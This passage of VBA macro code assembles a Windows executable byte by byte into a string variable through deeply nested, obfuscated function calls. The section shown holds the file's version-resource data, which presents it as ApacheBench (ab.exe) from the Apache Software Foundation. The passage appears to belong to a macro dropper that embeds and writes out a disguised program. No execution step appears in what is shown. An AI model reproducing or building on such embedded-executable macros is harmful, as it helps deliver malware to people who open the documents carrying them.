    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 16), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 24), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 1), 0), 0), 0), "0"), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 1), 0), 9), 4), 0), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "H"), 0), 0), 0), "`P"), 1), 0), "h"), 7), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "h"), 7), "4"), 0), 0), 0), "V"), 0), "S"), 0), "_"), 0), "V"), 0), "E"), 0), "R"), 0), "S"), 0), "I"), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "O"), 0), "N"), 0), "_"), 0), "I"), 0), "N"), 0), "F"), 0), "O"), 0), 0), 0), 0), 0), 189), 4), 239), 254), 0), 0), 1), 0), 2), 0), 2), 0), 0), 0), 14), 0), 2), 0), 2), 0), 0), 0), 14), 0), "?"), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 4), 0), 0), 0), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 198), 6), 0), 0), 1), 0), "S"), 0), "t"), 0), "r"), 0), "i"), 0), "n"), 0), "g"), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "I"), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "f"), 0), "o"), 0), 0), 0), 162), 6), 0), 0), 1), 0), "0"), 0), "4"), 0), "0"), 0), "9"), 0), "0"), 0), "4"), 0), "b"), 0), "0"), 0), 0), 0), "0"), 4), 12), 2), 1), 0), "C"), 0), "o"), 0), "m"), 0), "m"), 0), "e"), 0), "n"), 0), "t"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "s"), 0), 0), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), "d"), 0), " "), 0), "u"), 0), "n"), 0), "d"), 0), "e"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), ","), 0), " "), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), " "), 0), "2"), 0), "."), 0), "0"), 0), " "), 0), "("), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(strPE, "t"), 0), "h"), 0), "e"), 0), " "), 0), 34), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), 34), 0), ")"), 0), ";"), 0), " "), 0), "y"), 0), "o"), 0), "u"), 0), " "), 0), "m"), 0), "a"), 0), "y"), 0), " "), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "o"), 0), "t"), 0), " "), 0), "u"), 0), "s"), 0), "e"), 0), " "), 0), "t"), 0), "h"), 0), "i"), 0), "s"), 0), " "), 0), "f"), 0), "i"), 0), "l"), 0), "e"), 0), " "), 0), "e"), 0), "x"), 0), "c"), 0), "e"), 0), "p"), 0), "t"), 0), " "), 0), "i"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), " "), 0), "c"), 0), "o"), 0), "m"), 0), "p"), 0), "l"), 0), "i"), 0), "a"), 0), "n"), 0), "c"), 0), "e"), 0), " "), 0), "w"), 0), "i"), 0), "t"), 0), "h"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "e"), 0), "n"), 0), "s"), 0), "e"), 0), "."), 0), " "), 0), "Y"), 0), "o"), 0), "u"), 0), " "), 0), "m"), 0), "a"), 0), "y"), 0), " "), 0), "o"), 0), "b"), 0), "t"), 0), "a"), 0), "i"), 0), "n"), 0), " "), 0), "a"), 0), " "), 0), "c"), 0), "o"), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "p"), 0), "y"), 0), " "), 0), "o"), 0), "f"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), " "), 0), "a"), 0), "t"), 0), 13), 0), 10), 0), 13), 0), 10), 0), "h"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "t"), 0), "t"), 0), "p"), 0), ":"), 0), "/"), 0), "/"), 0), "w"), 0), "w"), 0), "w"), 0), "."), 0), "a"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), "."), 0), "o"), 0), "r"), 0), "g"), 0), "/"), 0), "l"), 0), "i"), 0), "c"), 0), "e"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), "s"), 0), "e"), 0), "s"), 0), "/"), 0), "L"), 0), "I"), 0), "C"), 0), "E"), 0), "N"), 0), "S"), 0), "E"), 0), "-"), 0), "2"), 0), "."), 0), "0"), 0), 13), 0), 10), 0), 13), 0), 10), 0), "U"), 0), "n"), 0), "l"), 0), "e"), 0), "s"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "s"), 0), " "), 0), "r"), 0), "e"), 0), "q"), 0), "u"), 0), "i"), 0), "r"), 0), "e"), 0), "d"), 0), " "), 0), "b"), 0), "y"), 0), " "), 0), "a"), 0), "p"), 0), "p"), 0), "l"), 0), "i"), 0), "c"), 0), "a"), 0), "b"), 0), "l"), 0), "e"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "l"), 0), "a"), 0), "w"), 0), " "), 0), "o"), 0), "r"), 0), " "), 0), "a"), 0), "g"), 0), "r"), 0), "e"), 0), "e"), 0), "d"), 0), " "), 0), "t"), 0), "o"), 0), " "), 0), "i"), 0), "n"), 0), " "), 0), "w"), 0), "r"), 0), "i"), 0), "t"), 0), "i"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), "g"), 0), ","), 0), " "), 0), "s"), 0), "o"), 0), "f"), 0), "t"), 0), "w"), 0), "a"), 0), "r"), 0), "e"), 0), " "), 0), "d"), 0), "i"), 0), "s"), 0), "t"), 0), "r"), 0), "i"), 0), "b"), 0), "u"), 0), "t"), 0), "e"), 0), "d"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "u"), 0), "n"), 0), "d"), 0), "e"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), " "), 0), "i"), 0), "s"), 0), " "), 0), "d"), 0), "i"), 0), "s"), 0), "t"), 0)
    strPE = A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "r"), 0), "i"), 0), "b"), 0), "u"), 0), "t"), 0), "e"), 0), "d"), 0), " "), 0), "o"), 0), "n"), 0), " "), 0), "a"), 0), "n"), 0), " "), 0), 34), 0), "A"), 0), "S"), 0), " "), 0), "I"), 0), "S"), 0), 34), 0), " "), 0), "B"), 0), "A"), 0), "S"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "I"), 0), "S"), 0), ","), 0), " "), 0), "W"), 0), "I"), 0), "T"), 0), "H"), 0), "O"), 0), "U"), 0), "T"), 0), " "), 0), "W"), 0), "A"), 0), "R"), 0), "R"), 0), "A"), 0), "N"), 0), "T"), 0), "I"), 0), "E"), 0), "S"), 0), " "), 0), "O"), 0), "R"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, " "), 0), "C"), 0), "O"), 0), "N"), 0), "D"), 0), "I"), 0), "T"), 0), "I"), 0), "O"), 0), "N"), 0), "S"), 0), " "), 0), "O"), 0), "F"), 0), " "), 0), "A"), 0), "N"), 0), "Y"), 0), " "), 0), "K"), 0), "I"), 0), "N"), 0), "D"), 0), ","), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "e"), 0), "i"), 0), "t"), 0), "h"), 0), "e"), 0), "r"), 0), " "), 0), "e"), 0), "x"), 0), "p"), 0), "r"), 0), "e"), 0), "s"), 0), "s"), 0), " "), 0), "o"), 0), "r"), 0), " "), 0), "i"), 0), "m"), 0), "p"), 0), "l"), 0), "i"), 0), "e"), 0), "d"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "."), 0), " "), 0), "S"), 0), "e"), 0), "e"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), " "), 0), "f"), 0), "o"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, " "), 0), "s"), 0), "p"), 0), "e"), 0), "c"), 0), "i"), 0), "f"), 0), "i"), 0), "c"), 0), " "), 0), "l"), 0), "a"), 0), "n"), 0), "g"), 0), "u"), 0), "a"), 0), "g"), 0), "e"), 0), " "), 0), "g"), 0), "o"), 0), "v"), 0), "e"), 0), "r"), 0), "n"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "i"), 0), "n"), 0), "g"), 0), " "), 0), "p"), 0), "e"), 0), "r"), 0), "m"), 0), "i"), 0), "s"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), "s"), 0), " "), 0), "a"), 0), "n"), 0), "d"), 0), " "), 0), "l"), 0), "i"), 0), "m"), 0), "i"), 0), "t"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), "s"), 0), " "), 0), "u"), 0), "n"), 0), "d"), 0), "e"), 0), "r"), 0), " "), 0), "t"), 0), "h"), 0), "e"), 0), " "), 0), "L"), 0), "i"), 0), "c"), 0), "e"), 0), "n"), 0), "s"), 0), "e"), 0), "."), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 0), 0), "V"), 0), 27), 0), 1), 0), "C"), 0), "o"), 0), "m"), 0), "p"), 0), "a"), 0), "n"), 0), "y"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), 0), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), " "), 0), "S"), 0)
    strPE = A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "o"), 0), "f"), 0), "t"), 0), "w"), 0), "a"), 0), "r"), 0), "e"), 0), " "), 0), "F"), 0), "o"), 0), "u"), 0), "n"), 0), "d"), 0), "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), "j"), 0), "!"), 0), 1), 0), "F"), 0), "i"), 0)

    PE28 = strPE
End Function

Private Function PE29() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "l"), 0), "e"), 0), "D"), 0), "e"), 0), "s"), 0), "c"), 0), "r"), 0), "i"), 0), "p"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), "B"), 0), "e"), 0), "n"), 0), "c"), 0)
    strPE = A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "h"), 0), " "), 0), "c"), 0), "o"), 0), "m"), 0), "m"), 0), "a"), 0), "n"), 0), "d"), 0), " "), 0), "l"), 0), "i"), 0), "n"), 0), "e"), 0), " "), 0), "u"), 0), "t"), 0), "i"), 0), "l"), 0), "i"), 0), "t"), 0), "y"), 0), 0), 0), 0), 0), "."), 0)
    strPE = A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(strPE, 7), 0), 1), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), "2"), 0), "."), 0), "2"), 0), "."), 0), "1"), 0), "4"), 0), 0), 0), 0), 0), "."), 0), 7), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 1), 0), "I"), 0), "n"), 0), "t"), 0), "e"), 0), "r"), 0), "n"), 0), "a"), 0), "l"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), "a"), 0), "b"), 0), "."), 0), "e"), 0), "x"), 0), "e"), 0), 0), 0), 0), 0), 130), 0), "/"), 0), 1), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "L"), 0), "e"), 0), "g"), 0), "a"), 0), "l"), 0), "C"), 0), "o"), 0), "p"), 0), "y"), 0), "r"), 0), "i"), 0), "g"), 0), "h"), 0), "t"), 0), 0), 0), "C"), 0), "o"), 0), "p"), 0), "y"), 0), "r"), 0), "i"), 0), "g"), 0), "h"), 0), "t"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "2"), 0), "0"), 0), "0"), 0), "9"), 0), " "), 0), "T"), 0), "h"), 0), "e"), 0), " "), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), " "), 0), "S"), 0), "o"), 0), "f"), 0), "t"), 0), "w"), 0), "a"), 0), "r"), 0), "e"), 0), " "), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "F"), 0), "o"), 0), "u"), 0), "n"), 0), "d"), 0), "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), "."), 0), 0), 0), 0), 0), "6"), 0), 7), 0), 1), 0), "O"), 0), "r"), 0), "i"), 0), "g"), 0), "i"), 0), "n"), 0), "a"), 0), "l"), 0), "F"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "i"), 0), "l"), 0), "e"), 0), "n"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), "a"), 0), "b"), 0), "."), 0), "e"), 0), "x"), 0), "e"), 0), 0), 0), 0), 0), "F"), 0), 19), 0), 1), 0), "P"), 0), "r"), 0), "o"), 0), "d"), 0), "u"), 0), "c"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "t"), 0), "N"), 0), "a"), 0), "m"), 0), "e"), 0), 0), 0), 0), 0), "A"), 0), "p"), 0), "a"), 0), "c"), 0), "h"), 0), "e"), 0), " "), 0), "H"), 0), "T"), 0), "T"), 0), "P"), 0), " "), 0), "S"), 0), "e"), 0), "r"), 0), "v"), 0), "e"), 0), "r"), 0)
    strPE = A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "2"), 0), 7), 0), 1), 0), "P"), 0), "r"), 0), "o"), 0), "d"), 0), "u"), 0), "c"), 0), "t"), 0), "V"), 0), "e"), 0), "r"), 0), "s"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), "2"), 0), "."), 0), "2"), 0), "."), 0), "1"), 0)
    strPE = A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(strPE, "4"), 0), 0), 0), 0), 0), "D"), 0), 0), 0), 1), 0), "V"), 0), "a"), 0), "r"), 0), "F"), 0), "i"), 0), "l"), 0), "e"), 0), "I"), 0), "n"), 0), "f"), 0), "o"), 0), 0), 0), 0), 0), "$"), 0), 4), 0), 0), 0), "T"), 0), "r"), 0), "a"), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "n"), 0), "s"), 0), "l"), 0), "a"), 0), "t"), 0), "i"), 0), "o"), 0), "n"), 0), 0), 0), 0), 0), 9), 4), 176), 4), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
